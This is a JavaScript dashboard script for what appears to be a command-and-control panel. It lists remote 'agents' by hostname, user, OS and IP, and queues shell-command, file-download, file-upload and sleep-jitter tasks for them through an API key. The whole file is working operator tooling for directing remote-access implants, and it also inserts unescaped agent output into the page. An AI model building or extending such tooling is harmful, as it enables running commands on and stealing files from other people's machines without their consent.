

/* ================= AGENTS ================= */
async function updateAgents() {
    try {
        const res = await fetch("/agents-data");
        const agents = await res.json();
        const tbody = document.getElementById("agentsBody");
        tbody.innerHTML = "";

        agents.forEach(a => {
            let id = a.id;

            // last_seen is now a UNIX timestamp
            let status = a.online ? "Online" : "Offline";
            let badgeClass = a.online ? "status-online" : "status-offline";

            let seconds = Math.floor(Date.now()/1000 - a.last_seen);


            let row = document.createElement("tr");
            row.innerHTML = `
                <td><span class="badge ${badgeClass}">${status}</span></td>
                <td>${id}</td>
                <td>${a.hostname || ""}</td>
                <td>${a.user || ""}</td>
                <td>${a.os || ""}</td>
                <td>${a.ip || ""}</td>
                <td>${seconds}s ago</td>
            `;
            tbody.appendChild(row);
        });
    } catch (e) {
        console.error(e);
    }
}

/* ================= TASKS ================= */
async function updateTasks() {
    try {
        const res = await fetch("/tasks-data");
        const tasks = await res.json();
        const tbody = document.getElementById("tasksBody");
        tbody.innerHTML = "";

        Object.entries(tasks).forEach(([uuid, t]) => {
            const task = t.task;
            let status = t.output ? "Completed" : "Pending";
            let badge = t.output ? "bg-success" : "bg-warning";

            let row = document.createElement("tr");
            if (t.output) row.classList.add("task-completed");

            row.innerHTML = `
                <td><span class="badge ${badge}">${status}</span></td>
                <td>${t.agent_id}</td>
                <td>${task.type}: ${task.command || task.url || task.path_to_file || ""}</td>
                <td>${t.output || "Waiting for result..."}</td>
                <td>${uuid}</td>
                <td><button class="btn btn-sm btn-outline-danger" onclick="deleteTask('${uuid}')">Delete</button></td>
            `;
            tbody.appendChild(row);
        });
    } catch (e) {
        console.error(e);
    }
}

/* ================= DELETE TASK ================= */
function deleteTask(uuid) {
    if (!confirm("Delete task?")) return;

    fetch("/tasks/" + uuid, {
        method: "DELETE",
        headers: {
            "Authorization": "Bearer " + API_KEY,
            "Content-Type": "application/json"
        }
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === "deleted") {
            // remove the row from the table
            const row = document.querySelector(`#tasksBody tr td:last-child button[onclick*="${uuid}"]`).closest("tr");
            if (row) row.remove();
        } else {
            alert("Failed to delete task: " + (data.error || "Unknown error"));
        }
    })
    .catch(err => {
        console.error(err);
        alert("Network or server error");
    });
}
/* ================= SEND TASK ================= */
document.getElementById("taskForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const agentId = document.getElementById("agentId").value.trim();
    const type = document.getElementById("taskType").value;
    const cmd = document.getElementById("taskCommand").value.trim();
    const extra = document.getElementById("taskExtra").value.trim();

    let task = { type: type };

    if (type === "shell") task.command = cmd;
    else if (type === "download") { task.url = cmd; task.save_as = extra; }
    else if (type === "upload") task.path_to_file = cmd;
    else if (type === "sleep") { task.min = parseInt(cmd) || 5; task.max = parseInt(extra) || 10; }

    await fetch("/task", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer " + API_KEY
        },
        body: JSON.stringify({ id: agentId, task: task })
    });

    document.getElementById("taskForm").reset();
    updateTasks();
});

/* ================= AUTO REFRESH ================= */
updateAgents();
updateTasks();
setInterval(updateAgents, 3000);
setInterval(updateTasks, 2000);
